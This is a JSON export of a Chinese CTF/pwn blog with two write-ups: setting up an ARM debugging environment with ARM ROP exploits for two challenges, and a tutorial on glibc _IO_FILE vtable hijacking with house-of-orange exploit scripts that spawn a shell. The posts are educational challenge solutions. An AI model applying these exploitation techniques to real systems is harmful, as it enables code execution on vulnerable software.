{"meta":{"title":"Room of Requirement","subtitle":"pwn what you want","description":"pwn菜鸡一枚","author":"Sirius Whiter","url":"http://siriuswhiter.tk"},"pages":[{"title":"About Me","date":"2018-08-24T04:15:58.000Z","updated":"2018-08-24T05:21:32.074Z","comments":true,"path":"about/index.html","permalink":"http://siriuswhiter.tk/about/index.html","excerpt":"","text":"I’m Sirius Whiter,a sophomore at CUG,pwn noob.Bosses do light spray.contact me at github:siriuswhiterFor the pwn is long and full of terrors"},{"title":"archives","date":"2018-08-24T04:17:49.000Z","updated":"2018-08-24T04:17:49.342Z","comments":true,"path":"archives/index.html","permalink":"http://siriuswhiter.tk/archives/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-08-24T04:17:06.000Z","updated":"2018-09-25T13:27:02.130Z","comments":true,"path":"categories/index.html","permalink":"http://siriuswhiter.tk/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-25T12:54:31.000Z","updated":"2018-09-25T13:09:27.033Z","comments":true,"path":"tags/index-1.html","permalink":"http://siriuswhiter.tk/tags/index-1.html","excerpt":"","text":"skills pwn RE"},{"title":"tags","date":"2018-08-24T04:16:44.000Z","updated":"2018-09-25T13:26:11.605Z","comments":true,"path":"tags/index.html","permalink":"http://siriuswhiter.tk/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"Arm-pwn 环境搭建及示例","slug":"arm-pwn-环境搭建及示例","date":"2019-07-13T02:36:41.000Z","updated":"2019-07-14T01:46:36.268Z","comments":true,"path":"2019/07/13/arm-pwn-环境搭建及示例/","link":"","permalink":"http://siriuswhiter.tk/2019/07/13/arm-pwn-环境搭建及示例/","excerpt":"","text":"为了搭建这个环境费了好多心思，也花了好久好久~~~，网上的教程大多都是arm的板子的调试，最后终于找到了简单合适的办法 环境搭建在已经有了gdb ，pwntools等之前pwn需要的环境下来进行下面的搭建 安装gdb-multiarch 1sudo apt-get install gdb-multiarch 安装qemu，这个倒是不论在什么教程里都一定会有的，模拟跨平台神器，这里貌似只要安装qemu-user就可以了binfmt*是用来识别文件类型 123sudo apt-get install qemu-usersudo apt-get install qemu-user-binfmtsudo apt-get install &quot;binfmt*&quot; 只用这两步就可以直接运行静态链接的arm程序，尝试打开jarvisoj的typo，正常运行123456789sirius@ubuntu:~/tikool/arm-test$ file typotypo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, strippedsirius@ubuntu:~/tikool/arm-test$ ./typo Let&apos;s Do Some Typing Exercise~Press Enter to get start;Input ~ if you want to quit------Begin------sour 下一步是为了能够运行动态链接的跨平台如arm的程序的 查找1apt search &quot;libc6-&quot; | grep &apos;arm&apos; 或利用tab补全来查看1sudo apt-get install libc6-* 在其中寻找所需的架构对应的库，比如arm32用的是这个1sudo apt-get install libc6-armel-cross 运行方式，-L 指定运行库，-g 指定端口1qemu-arm -L /usr/arm-linux-gnueabi ./ciscn_2019_en_1 arm（大端）和armel（小端）区别在于存储方式，一个是大端（低序存在高地址，按顺序来），一个是小端序（将低序的存在低地址，反常识来）。其他如mips同理 这里使用信安大赛华北赛区的一道arm题来测试，不加参数-g可以直接运行1234567sirius@ubuntu:~/tikool/arm-test$ file ciscn_2019_en_1 ciscn_2019_en_1: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=1aaea66452d1dc8a477419b71a3ebaaad001ada1, strippedsirius@ubuntu:~/tikool/arm-test$ qemu-arm -L /usr/arm-linux-gnueabi ./ciscn_2019_en_1 your name:aaaaaaaahello aaaaaaaa 调试，之前一直就是调试这里搭不好，这里不需要用gdbserver。。 首先让程序按上面的步骤在一个端口比如说1234跑起来，然后在另一边使用gdb-multiarch进行调试1gdb-multiarch pwnname 进入gdb后 set architecture 设置架构（据说一般都会自动识别成功，不用设置），然后target remote ip:port 远程连接 测试1234pwndbg&gt; set architecture armThe target architecture is assumed to be armpwndbg&gt; target remote :1234Remote debugging using :1234 脚本调试 使用socat在本地运行1socat tcp-l:10002,fork exec:&quot;qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./pwn&quot;;reuseaddr 脚本12remote 127.0.0.1:10002pause() 这里将pause相当于断点，pause之后再开窗口打开gdb-multiarch进行调试，这样还是有点麻烦，但是现在不知道有什么好办法。 关于ARM参考：https://www.jianshu.com/p/bd96a8f58cbd arm'' r0 - r3 存放参数 1-4 ，其余参数从右到左入栈； 被调用者实现栈平衡； 返回值存放在r0 R13 相当于栈指针ESP/RSP PC 相当于EIP/RIP指针LR link register 保存返回地址的寄存器 BL 相当于call ， 跳转并把返回值保存到LR中B 相当于jmpBX 跳转并切换状态 ARM 与THUMB 指令BLX 带返回的跳转并切换状态 示例typo题目静态链接，简单的ROP，但是arm的看起来没那么熟悉；开启栈不可执行保护，其他没开 思路先找下gadget，因为被strip了，没有了符号表，所以system无法直接找到说是用rizzo可以恢复部分符号因为要传一个参数，所以可以找下r0 关于导入符号表 先把导入的libc文件拿出来,使用rizzo导出为.riz文件 导出 再把riz导入文件 导入 12$ ROPgadget --binary typo --only &apos;pop&apos; | grep r00x00020904 : pop &#123;r0, r4, pc&#125; 里面刚好还要pc，前面已经指定pc是相当于eip指针，所以这里可以顺便把system pop到 pc 关于偏移，理论上是可以用pwntools的cyclic，但是在arm程序里运行的不太对，不知道哪里出错了，只能爆破一下得到偏移 exp123456789101112131415161718192021222324252627from pwn import *import syscontext.binary = &apos;typo&apos;if len(sys.argv) &gt; 1: local = 0else: local = 1if local: sh = process([&apos;qemu-arm&apos;, &apos;-L&apos;, &apos;/usr/arm-linux-gnueabi&apos;, &apos;typo&apos;]) elf = ELF(&apos;./typo&apos;)else: sh = remote(&apos;127.0.01&apos;,&apos;10002&apos;) elf = ELF(&apos;./typo&apos;)pause()pop_r0_r4_pc = 0x00020904system = 0x110b4binsh = 0x6c384pay = &apos;a&apos;*112+p32(pop_r0_r4_pc)+p32(binsh)*2+p32(system)sh.recv()sh.sendline(&quot;&quot;)#pause()sh.recv()sh.send(pay)sh.interactive() easy_arm题目半决赛的题。。因为是arm的大部分就没做出来。。 12345678910signed int vul()&#123; char buf; // [sp+0h] [bp-24h] setup(); puts(&quot;your name:\\n&quot;); read(0, &amp;buf, 0x100u); printf(&quot;hello %s\\n&quot;, &amp;buf); return 1;&#125; 思路寻找可用的gadget，为了后面能够进行参数传递势必要能够控制r0 直接用ROPgadget only pop时1234567$ ROPgadget --binary &apos;ciscn_2019_en_1&apos; --only &apos;pop&apos;Gadgets information============================================================0x000103a4 : pop &#123;r3, pc&#125;0x000104f8 : pop &#123;r4, pc&#125;Unique gadgets found: 2 这里只能够直接控制r3 和返回地址pc ，所以还需要找点其他的 10x00010638 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125; ; andeq r0, r1, r8, lsl sb ; andeq r0, r1, r0, lsl sb ; bx lr 这边发现能控制很多寄存器，但是没有r0；单独寻找r0相关，找到了这个10x00010628 : mov r0, r7 ; blx r3 因为上一步能够控制r7，也就相当于可以控制这里的r0。构造rop链，第一次进行泄露libc地址，第二次getshell 中间发现使用上面的构造链会泄露完地址就fault退出，不过也发现了基址是不变的，可以泄露完再打一次getshell exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354from pwn import *import syscontext.binary = &apos;ciscn_2019_en_1&apos;#context.log_level = &apos;debug&apos;if len(sys.argv) &gt; 1: local = 0else: local = 1if local: sh = process([&apos;qemu-arm&apos;, &apos;-L&apos;, &apos;/usr/arm-linux-gnueabi&apos;, &apos;ciscn_2019_en_1&apos;]) elf = ELF(&apos;./ciscn_2019_en_1&apos;) libc = ELF(&apos;/usr/arm-linux-gnueabi/lib/libc.so.6&apos;)else: sh = remote(&apos;&apos;,&apos;&apos;) elf = ELF(&apos;./ciscn_2019_en_1&apos;)mov_r07_br3 = 0x10628pop_r3_pc = 0x103a4puts_got = elf.got[&apos;puts&apos;]puts_plt = elf.plt[&apos;puts&apos;]pop_r45678sbslpc = 0x10638sh.recv()pay = &apos;a&apos;*0x24+p32(pop_r45678sbslpc)pay += p32(0)*3+p32(puts_got) #r7pay += p32(0)*3+p32(pop_r3_pc) #pcpay += p32(puts_plt) #r3pay += p32(mov_r07_br3) #pcsh.sendline(pay)sh.recvuntil(&apos;\\n&apos;)#print sh.recv()puts_addr = u32(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(4,&apos;\\x00&apos;))libc.base = puts_addr - libc.symbols[&apos;puts&apos;]print hex(libc.base)system_addr = libc.base + libc.symbols[&apos;system&apos;]binsh_addr = libc.base + libc.search(&apos;/bin/sh\\x00&apos;).next()sh = process([&apos;qemu-arm&apos;, &apos;-L&apos;, &apos;/usr/arm-linux-gnueabi&apos;, &apos;ciscn_2019_en_1&apos;])pay = &apos;a&apos;*0x24+p32(pop_r45678sbslpc)pay += p32(0)*3+p32(binsh_addr)pay += p32(0)*3+p32(pop_r3_pc)pay += p32(system_addr)pay += p32(mov_r07_br3)sh.recv()sh.sendline(pay)sh.interactive() 之前的尝试笔记之前做到的比较好的地方在于动态链接程序也能直接跑而不用指定库，应该是建立的软连接和导入库路径的设置 arm 程序运行 安装必要的程序 qemu gcc for arm 交叉编译 1sudo apt install qemu gcc-5-arm-linux-gnueabihf gcc-5-multilib-arm-linux-gnueabihf 运行arm文件 1qemu-arm ./filename 提示找不到库1/lib/ld-linux-armhf.so.3: No such file or directory 查找并建立软连接123find / -name ld-linux-armhf.so.3sudo ln -s /usr/arm-linux-gnueabihf/lib/ld-linux-armhf.so.3 /lib/ld-linux-armhf.so.3 再运行找不到libc.so.61export LD_LIBRARY_PATH=/usr/arm-linux-gnueabihf/lib/:$LD_LIBRARY_PATH 方便起见写入自启动脚本（一般还是不要写的好。。1echo &quot;export LD_LIBRARY_PATH=/usr/arm-linux-gnueabihf/lib/:$LD_LIBRARY_PATH&quot; &gt;&gt; ~/.bashrc arm-gdbgdb源码下载：http://www.gnu.org/software/gdb/download/ gdb 版本不要太高，这里选择和本机一个版本的gdb 解压：tar xvf gdb-7.11.1.tar.xz 安装可能需要的库 sudo apt-get install texinfo libncurses5-dev m4 flex bison 编译arm-linux-gdb &amp; gdbserver 进入源码目录： 123./configure --target=arm-linux --prefix=/home/sirius/tools/gdb/arm-gdbmake -j8sudo make install -j8 这里可能会报错说__NR_rt_sigreturn未定义加个头文件123#ifndef __NR_sigreturn#include &lt;asm/unistd.h&gt;#endif arm-gdb/bin 下可以看到 arm-linux-gdb arm-linux-run 将其加入环境变量： 12vi /etc/profileexport PATH=$PATH:/home/sirius/tools/gdb/arm-gdb/bin 编译gdb client 12345678cd gdb/gdbserverexport PATH=$PATH:/home/sirius/tools/gdb/arm-gdb/bin./configure --target=arm-linux --host=arm-linux-gnueabivi config.h#define HAVA_SYS_REG_H 将此句注释make CC=arm-linux-gnueabi-gcc -j8 这里可能会报错说没有arm-linux-gnueabi-gcc， 使用apt安装就可以了 使用1gdbserver :1234 ./pwn 这里调试的时候便会出错","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"stack","slug":"stack","permalink":"http://siriuswhiter.tk/tags/stack/"}]},{"title":"_IO_FILE 利用方法","slug":"io-file-利用方法","date":"2019-07-09T07:51:56.000Z","updated":"2019-07-16T06:46:10.895Z","comments":true,"path":"2019/07/09/io-file-利用方法/","link":"","permalink":"http://siriuswhiter.tk/2019/07/09/io-file-利用方法/","excerpt":"","text":"前置知识细节知识可以看https://www.siriuswhiter.tk/2019/07/08/io-file-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/ FILE结构体会通过struct _IO_FILE *_chain链接成一个链表，64位程序下其偏移为0x60，链表头部用_IO_list_all指针表示。 图示 所以新建的文件句柄的chains会指向stderr IO_file结构体外面还被一个IO_FILE_plus结构体包裹着，其定义如下： struct _IO_FILE_plus{ _IO_FILE file; IO_jump_t *vtable;} 输出方法,eg:1p *(struct _IO_FILE_plus *) stdout IO_FILE 结构体123456789101112131415161718192021222324252627282930313233343536373839404142struct _IO_FILE &#123; int _flags; /* High-order word is _IO_MAGIC; rest is flags. */#define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; /* 偏移： 0x68-0x70 */ int _fileno;#if 0 int _blksize;#else int _flags2;#endif _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small. */#define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock;#ifdef _IO_USE_OLD_IO_FILE&#125;; 偏移记录方便在使用时查看偏移进行伪造 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071_IO_FILE_plus_size = &#123; &apos;i386&apos;:0x98, &apos;amd64&apos;:0xe0&#125;_IO_FILE_plus = &#123; &apos;i386&apos;:&#123; 0x0:&apos;_flags&apos;, 0x4:&apos;_IO_read_ptr&apos;, 0x8:&apos;_IO_read_end&apos;, 0xc:&apos;_IO_read_base&apos;, 0x10:&apos;_IO_write_base&apos;, 0x14:&apos;_IO_write_ptr&apos;, 0x18:&apos;_IO_write_end&apos;, 0x1c:&apos;_IO_buf_base&apos;, 0x20:&apos;_IO_buf_end&apos;, 0x24:&apos;_IO_save_base&apos;, 0x28:&apos;_IO_backup_base&apos;, 0x2c:&apos;_IO_save_end&apos;, 0x30:&apos;_markers&apos;, 0x34:&apos;_chain&apos;, 0x38:&apos;_fileno&apos;, 0x3c:&apos;_flags2&apos;, 0x40:&apos;_old_offset&apos;, 0x44:&apos;_cur_column&apos;, 0x46:&apos;_vtable_offset&apos;, 0x47:&apos;_shortbuf&apos;, 0x48:&apos;_lock&apos;, 0x4c:&apos;_offset&apos;, 0x54:&apos;_codecvt&apos;, 0x58:&apos;_wide_data&apos;, 0x5c:&apos;_freeres_list&apos;, 0x60:&apos;_freeres_buf&apos;, 0x64:&apos;__pad5&apos;, 0x68:&apos;_mode&apos;, 0x6c:&apos;_unused2&apos;, 0x94:&apos;vtable&apos; &#125;, &apos;amd64&apos;:&#123; 0x0:&apos;_flags&apos;, 0x8:&apos;_IO_read_ptr&apos;, 0x10:&apos;_IO_read_end&apos;, 0x18:&apos;_IO_read_base&apos;, 0x20:&apos;_IO_write_base&apos;, 0x28:&apos;_IO_write_ptr&apos;, 0x30:&apos;_IO_write_end&apos;, 0x38:&apos;_IO_buf_base&apos;, 0x40:&apos;_IO_buf_end&apos;, 0x48:&apos;_IO_save_base&apos;, 0x50:&apos;_IO_backup_base&apos;, 0x58:&apos;_IO_save_end&apos;, 0x60:&apos;_markers&apos;, 0x68:&apos;_chain&apos;, 0x70:&apos;_fileno&apos;, 0x74:&apos;_flags2&apos;, 0x78:&apos;_old_offset&apos;, 0x80:&apos;_cur_column&apos;, 0x82:&apos;_vtable_offset&apos;, 0x83:&apos;_shortbuf&apos;, 0x88:&apos;_lock&apos;, 0x90:&apos;_offset&apos;, 0x98:&apos;_codecvt&apos;, 0xa0:&apos;_wide_data&apos;, 0xa8:&apos;_freeres_list&apos;, 0xb0:&apos;_freeres_buf&apos;, 0xb8:&apos;__pad5&apos;, 0xc0:&apos;_mode&apos;, 0xc4:&apos;_unused2&apos;, 0xd8:&apos;vtable&apos; &#125;&#125; IO_jump_t表结构12345678910111213141516171819202122232425struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);&#125;; 常用对应iofile函数12345fread -&gt; __xsgetn -&gt; __doallocate -&gt; __stat -&gt; __underflow -&gt; __readfwrite -&gt; __xsputn -&gt; __docallocate -&gt; __overflow -&gt; __writefclose -&gt; __finish -&gt; __overflow / -&gt; __fclose //根据标志位来改变模式malloc_printerr -&gt; __overflowexit -&gt; _setbuf 利用思路在源码分析中我们知道io相关操作最后会调用vtable中的函数，所以利用方法就是修改vtable中的值，或者是实现对整个FILE结构体的伪造来修改虚表，当然本质上没有太大的区别。 利用演示还是使用下how2heap上的例子，这里是结合了house of orange，可以跟着源码调试理解。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int winner ( char *ptr);int main()&#123; char *p1, *p2; size_t io_list_all, *top; // 首先分配一个 0x400 的 chunk p1 = malloc(0x400-16); // 拿到 top chunk的地址 top = (size_t *) ( (char *) p1 + 0x400 - 16); // 修改 top chunk 的 size top[1] = 0xc01; // 触发 syscall 的 _int_free, top_chunk 放到了 unsort bin p2 = malloc(0x1000); // 根据 fd 指针的偏移计算 io_list_all 的地址 io_list_all = top[2] + 0x9a8; // 修改 top_chunk 的 bk 为 io_list_all - 0x10 ， 后面会触发 top[3] = io_list_all - 0x10; /* 设置 fp 指针指向位置 开头 为 /bin/sh */ memcpy( ( char *) top, &quot;/bin/sh\\x00&quot;, 8); // 修改 top chunk 的 大小 为 0x60 top[1] = 0x61; /* 为了可以正常调用 overflow() ，需要满足一些条件 fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base */ _IO_FILE *fp = (_IO_FILE *) top; fp-&gt;_mode = 0; fp-&gt;_IO_write_base = (char *) 2; fp-&gt;_IO_write_ptr = (char *) 3; // 设置虚表 size_t *jump_table = &amp;top[12]; // controlled memory jump_table[3] = (size_t) &amp;winner; *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8 // 再次 malloc, fastbin, smallbin都找不到需要的大小，会遍历 unsort bin 把它们添加到对应的 bins 中去 // 之前已经把 top-&gt;bk 设置为 io_list_all - 0x10, 所以会把 io_list_all 的值 设置为 fd, // 也就是 main_arena+88 // _IO_FILE_plus + 0x68 --&gt; _china , main_arena+88 + 0x68 为 smallbin[5], 块大小为 0x60 // 所以要把 top的 size 设置为 0x60 malloc(10); return 0;&#125;int winner(char *ptr)&#123; system(ptr); return 0;&#125; 可以发现，实际上在利用时是将top chunk放入unsorted bin中之后将其作为FILE结构体，并将虚表设置在了FILE结构体中，最后触发malloc_printerr，内部调用libc_message，再内部调用abort，abort中调用fflush即_IO_flush_all_lockp，其中调用OVERFLOW时调用 vtable中的 __overflow，触发system(‘/bin/sh’)。 当然利用方法不止这一种，也能够使程序去调用其他函数getshell。 利用实例task_challenge1方向控制fp指针伪造FILE 与 vtable，因为fclose时调用vtable中的_finish，所以将其覆盖为system 伪造的FILE结构体前四个字节需要满足 flags &amp; is_filebuf 即 flags &amp; 0x2000为0，会直接调用_io_finish0xffffdfff &amp; 0x2000 = 0 123456789101112#define _IO_IS_FILEBUF 0x2000if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) _IO_un_link ((struct _IO_FILE_plus *) fp); _IO_acquire_lock (fp); if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF) status = _IO_file_close_it (fp); else status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0; _IO_release_lock (fp); _IO_FINISH (fp); 题目一道iofile练手题，与pwnable.tw上那道有些相似，可以输入，输出，退出 输入直接调用gets，在bss段，可以覆盖打开文件的指针，伪造结构体可以一块进行退出会调用fclose关闭文件12345.bss:00000000006010C0 ; char s[256].bss:00000000006010C0 s db 100h dup(?) ; DATA XREF: get+4↑o.bss:00000000006010C0 ; put+4↑o.bss:00000000006011C0 ; FILE *stream.bss:00000000006011C0 stream dq ? ; DATA XREF: exits+4↑r exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#!/usr/bin/env python2# -*- coding:utf-8 -*-import sysfrom pwn import *#context.log_level = &apos;debug&apos;#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]if len(sys.argv) &gt; 1: local = 0else: local = 1if local: sh = process(&apos;./task_challenge1&apos;) elf = ELF(&apos;./task_challenge1&apos;) libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)else: sh = remote(&apos;&apos;,&apos;&apos;) elf = ELF(&apos;task_challenge1&apos;) #libc=ELF(&apos;&apos;)buf_addr = 0x6010c0system = 0x400897fake_file = p32(0xffffdfff)+&apos;;/bin/sh\\x00&apos;fake_file = fake_file.ljust(0xd8,&apos;\\0&apos;)vtable = buf_addr+0xe0fake_file += p64(vtable)pay = fake_filepay += p64(0)*2pay += p64(system) #vtable finish , fclose will call this func.pay = pay.ljust(0x100,&apos;\\0&apos;)pay += p64(buf_addr)sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)sh.sendline(pay)#gdb.attach(sh)#sh.recv()#sh.sendline(&apos;3&apos;)#exits()sh.interactive() house of orange方向就是演示代码的实际利用。 malloc_printerr 会调用_io_overflow伪造被放入unsorted bin中的top chunk为FILE 结构体，使之能够绕过检查进入_IO_OVERFLOW (fp, EOF) 123456789 if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) //需要bypass的条件#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)) #endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) //改 _IO_OVERFLOW 为 system 劫持程序流！ result = EOF; 即需要满足任意一种1234561.fp-&gt;_mode &lt;= 02.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base或1._IO_vtable_offset (fp) == 02.fp-&gt;_mode &gt; 03.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base 题目house of orange 的开山之作，因而之后这种利用方法就叫做house of orange题目可以 build ,upgrade ,seebuild 会创建三个chunk，一个保存其中两个的指针，一个保存大小与颜色，最后为用户自定义大小不大于0x1000的chunk。upgrade 时没有考虑build时的大小，所以会直接溢出see 正常展示，后面会用来泄露 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107#!/usr/bin/env python2# -*- coding:utf-8 -*-import sysfrom pwn import *#context.log_level = &apos;debug&apos;#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]if len(sys.argv) &gt; 1: local = 0else: local = 1if local: sh = process(&apos;./houseoforange&apos;) elf = ELF(&apos;./houseoforange&apos;) libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)else: sh = remote(&apos;&apos;,&apos;&apos;) elf = ELF(&apos;./houseoforange&apos;) #libc=ELF(&apos;&apos;)def build(size,name,price,color): sh.recvuntil(&quot;:&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;:&quot;) sh.sendline(str(size)) sh.recvuntil(&quot;:&quot;) sh.send(name) sh.recvuntil(&quot;:&quot;) sh.sendline(str(price)) sh.recvuntil(&quot;:&quot;) sh.sendline(str(color))def see(): sh.recvuntil(&quot;:&quot;) sh.sendline(&quot;2&quot;)def upgrade(size,name,price,color): sh.recvuntil(&quot;:&quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;:&quot;) sh.sendline(str(size)) sh.recvuntil(&quot;:&quot;) sh.send(name) sh.recvuntil(&quot;:&quot;) sh.sendline(str(price)) sh.recvuntil(&quot;:&quot;) sh.sendline(str(color))build(0x20,&apos;1&apos;,20,1)pay = &apos;a&apos;*0x20+p64(0)+p64(0x21)+&apos;b&apos;*0x10+p64(0)+p64(0xf91)upgrade(len(pay),pay,20,1)#trigger _sys_mallocbuild(0x1000,&apos;2&apos;,20,2)build(0x400,&apos;3&apos;*8,20,3)see()sh.recvuntil(&apos;3&apos;*8)libc.base = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\0&apos;))-0x3c5188print hex(libc.base)io_list_all = libc.base + libc.symbols[&apos;_IO_list_all&apos;]print hex(io_list_all)system = libc.base + libc.symbols[&apos;system&apos;]print hex(system)upgrade(0x400,&apos;4&apos;*16,20,4)see()sh.recvuntil(&apos;4&apos;*16)heap_base = u64(sh.recvuntil(&apos;\\n&apos;,drop=True).ljust(8,&apos;\\0&apos;))-0xd0print hex(heap_base)pay = &apos;e&apos;*0x400pay += p64(0)+p64(0x21)+p32(1)+p32(0x14)+p64(0)# mode &gt;0 &amp;&amp; wide_data-&gt;write_ptr &gt; wide_data-&gt;write_base &amp;&amp; vtable_offset == 0fake_file = &apos;/bin/sh\\x00&apos;+p64(0x61)fake_file += p64(0xdeadbeef) + p64(io_list_all-0x10) #unsorted bin attackfake_file = fake_file.ljust(0xa0,&apos;\\x00&apos;)fake_file += p64(heap_base+0x4e0) #wide_datafake_file = fake_file.ljust(0xc0,&apos;\\x00&apos;)fake_file += p64(1) # mode# write_base &lt; write_ptr &amp;&amp; mode &lt;=0 fake_file2 = &apos;/bin/sh\\x00&apos;+p64(0x61)fake_file2 += p64(0xdeadbeef) + p64(io_list_all-0x10)fake_file2 += p64(0) + p64(1) # write_base &amp; write_ptrfake_file2 = fake_file2.ljust(0xc0,&apos;\\x00&apos;)fake_file2 += p64(0) # modepay += fake_file # fake_file &amp; fake_file2 对应着两种绕过检查pay += p64(0) + p64(0) pay += p64(heap_base+0x610) #vtablepay += p64(0)*2+p64(system)*10upgrade(0x800,pay,20,5)#gdb.attach(sh)sh.sendline(&apos;1&apos;)sh.interactive() mode &gt;0 &amp;&amp; wide_data-&gt;write_ptr &gt; wide_data-&gt;write_base &amp;&amp; vtable_offset == 0 1234567891011121314151617181920212223242526272829303132333435&gt; p *(struct _IO_FILE_plus *) 0x55b527f0b500$2 = &#123; file = &#123; _flags = 1852400175, _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, _IO_read_end = 0xdeadbeef &lt;error: Cannot access memory at address 0xdeadbeef&gt;, _IO_read_base = 0x7fa084964510 &quot;&quot;, _IO_write_base = 0x0, _IO_write_ptr = 0x0, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 &apos;\\000&apos;, _shortbuf = &quot;&quot;, _lock = 0x0, _offset = 0, _codecvt = 0x0, _wide_data = 0x55b527f0b4e0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 1, _unused2 = &apos;\\000&apos; &lt;repeats 19 times&gt; &#125;, vtable = 0x55b527f0b610&#125; write_base &lt; write_ptr &amp;&amp; mode &lt;=0 1234567891011121314151617181920212223242526272829303132333435&gt; p *(struct _IO_FILE_plus *) 0x55731d86f500 $1 = &#123; file = &#123; _flags = 1852400175, _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, _IO_read_end = 0xdeadbeef &lt;error: Cannot access memory at address 0xdeadbeef&gt;, _IO_read_base = 0x7fbcf865f510 &quot;&quot;, _IO_write_base = 0x0, _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0, _flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0 &apos;\\000&apos;, _shortbuf = &quot;&quot;, _lock = 0x0, _offset = 0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0, _mode = 0, _unused2 = &apos;\\000&apos; &lt;repeats 19 times&gt; &#125;, vtable = 0x55731d86f610&#125; 